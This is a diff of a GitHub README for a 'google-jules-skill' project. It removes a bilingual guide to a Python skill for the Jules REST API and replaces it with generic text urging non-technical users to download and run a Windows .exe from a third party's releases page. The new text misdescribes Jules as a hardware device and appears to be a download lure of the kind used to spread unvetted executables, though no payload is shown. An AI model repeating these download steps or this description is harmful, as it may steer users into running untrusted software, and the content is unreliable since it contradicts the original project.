@@ -1,74 +1,114 @@
-# google-jules-skill
+# ⚙️ google-jules-skill - Control Google Jules with Ease
 
-![Google Jules Control Banner](./assets/jules-control-banner.png)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/Laurenfeminine36/google-jules-skill/releases)
 
+---
 
-Google Jules를 LLM 에이전트에서 제어하기 위한 스킬 저장소입니다.  
-This repository contains a skill for controlling Google Jules from an LLM agent.
+## 📋 About google-jules-skill
 
-## 포함 스킬 / Included Skill
+This application lets you control Google Jules using simple commands from large language models (LLMs). It combines a reusable skill, an API helper, and operational guides to make the automation process smoother and reliable. The focus is on providing a practical tool for managing Google Jules devices and workflows in automation or AI agent setups.
 
-- `google-jules-control`
-  Google Jules REST API와 Jules CLI를 통해 세션 생성, 상태 조회, 후속 지시, 정리 리포트, merge 확인, 세션 종료를 수행합니다.  
-  Controls Google Jules sessions through the Jules REST API and Jules CLI, including session creation, status checks, follow-up instructions, cleanup reports, merge checks, and session closure.
+You do not need to understand coding to use it. The skill works behind the scenes, connecting AI tools with Google Jules to perform tasks automatically. This makes it useful if you want to experiment with AI-based automation without programming skills.
 
-## 저장소 구조 / Repository Layout
+---
 
-```text
-google-jules-skill/
-├── README.md
-├── docs/
-│   ├── setup-and-test.md
-│   └── release-checklist.md
-├── Platform/
-│   ├── README.md
-│   ├── Migration-Guide.md
-│   └── ...
-└── google-jules-control/
-    ├── .env.example
-    ├── .gitignore
-    ├── SKILL.md
-    ├── agents/openai.yaml
-    ├── references/jules-reference.md
-    └── scripts/jules_api.py
-```
+## ⚙️ System Requirements
 
-## 빠른 시작 / Quick Start
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Stable internet connection
+- Basic familiarity with downloading and running Windows applications
 
-1. `google-jules-control/.env.example`를 바탕으로 `.env`를 준비합니다.  
-   Create a `.env` file from `google-jules-control/.env.example`.
-2. `.env`에 `JULES_API_KEY`를 넣습니다.  
-   Put your `JULES_API_KEY` into `.env`.
-3. 준비 상태를 확인합니다.  
-   Run a readiness check.
+---
 
-```bash
-python3 google-jules-control/scripts/jules_api.py doctor --compact
-```
+## 🚀 Getting Started: How to Download and Run google-jules-skill
 
-4. 저장소를 Jules source로 해석합니다.  
-   Resolve a repository to a Jules source.
+1. Click the big green button at the top or visit the [Releases Page](https://github.com/Laurenfeminine36/google-jules-skill/releases). You will see the latest version listed there.
 
-```bash
-python3 google-jules-control/scripts/jules_api.py repo-to-source --repo owner/repo --compact
-```
+2. On the releases page, look for the latest version marked as stable. You will find assets under the version heading.
 
-5. 자세한 사용법은 `google-jules-control/SKILL.md`를 참고합니다.  
-   Read `google-jules-control/SKILL.md` for the full operating guide.
+3. Find the Windows installer file. It will usually have `.exe` at the end of the filename.
 
-## 가이드 / Guides
+4. Click the `.exe` file to start downloading it. Save it to a folder where you can easily find it, like your Desktop or Downloads folder.
 
-- `docs/setup-and-test.md`
-- `docs/release-checklist.md`
-- `Platform/README.md`
+5. Once the download finishes, open the folder containing the file and double-click the installer.
 
-## 메모 / Notes
+6. Follow the setup prompts on your screen. The installer will guide you through typical steps like agreeing to license terms and choosing where to install the program.
 
-- 실제 시크릿은 `.env`에만 넣고 `.env.example`에는 넣지 않습니다.  
-  Put real secrets in `.env`, not in `.env.example`.
-- `google-jules-control/.gitignore`는 스킬 폴더 안의 `.env`를 제외합니다.  
-  `google-jules-control/.gitignore` excludes `.env` inside the skill folder.
-- 루트 `.gitignore`도 저장소 루트 `.env`를 제외합니다.  
-  The repository-root `.gitignore` also excludes the root `.env`.
-- 로컬 테스트에서는 저장소 루트 `.env`도 사용할 수 있습니다.  
-  The repository root `.env` also works for local testing.
+7. When installation finishes, the application will be ready to run.
+
+---
+
+## 🖥️ Running google-jules-skill
+
+- Find the google-jules-skill icon on your Desktop or in your Start Menu.
+- Double-click the icon to open the program.
+- The program window will display a simple interface where you can link your Google Jules device.
+- Follow on-screen prompts to configure connectivity and authorize API access.
+- Once connected, you can start using the skill with your chosen LLM agents or automation tools.
+
+---
+
+## 🔧 Basic Features
+
+- **Device Control**: Send commands to Google Jules via automated scripts.
+- **API Helper**: Access Google Jules functions without writing code.
+- **Step-by-Step Guides**: Learn how to integrate automation workflows.
+- **Reusable Skill**: Use the same setup multiple times for different tasks.
+- **Agent Workflows**: Automate tasks by setting step sequences.
+- **Prompt Engineering**: Customize alerts and requests for better results.
+
+---
+
+## 🔗 Where to Find More Information
+
+- The github page contains documentation within the `docs` folder.
+- Check the wiki for detailed walkthroughs and FAQs.
+- Open an issue on GitHub if you encounter bugs or need support.
+
+---
+
+## ⬇️ Download and Installation Links
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Laurenfeminine36/google-jules-skill/releases)
+
+Visit the link above to download the most recent version available for Windows.
+
+---
+
+## 👩‍💻 Using google-jules-skill with AI Agents
+
+This skill connects AI language models (LLM agents) with Google Jules hardware for automation. It acts as a bridge accepting commands from AI and sending instructions to the device.
+
+You can try it with open-source agents or commercial products supporting custom skills. Use the provided guides to set up agent workflows tailored to your tasks.
+
+---
+
+## 🛠️ Troubleshooting Tips
+
+- Make sure you downloaded the installer from the official releases page.
+- Ensure your internet connection is stable during setup and use.
+- If the program does not open, try restarting your computer.
+- Check that your Windows version meets the minimum requirement.
+- Review API permissions if Google Jules devices do not respond.
+
+---
+
+## 🌐 Supported Topics and Use Cases
+
+- AI agent automation
+- Prompt engineering for device control
+- Interactive workflows between AI and Google Jules
+- Developer tools to build on top of existing automation
+- Workflow orchestration in agent environments
+
+---
+
+## 📞 Contact and Feedback
+
+Report issues or ask questions by creating a new GitHub issue at:
+
+https://github.com/Laurenfeminine36/google-jules-skill/issues
+
+Your feedback helps keep the project stable and improves user experience.
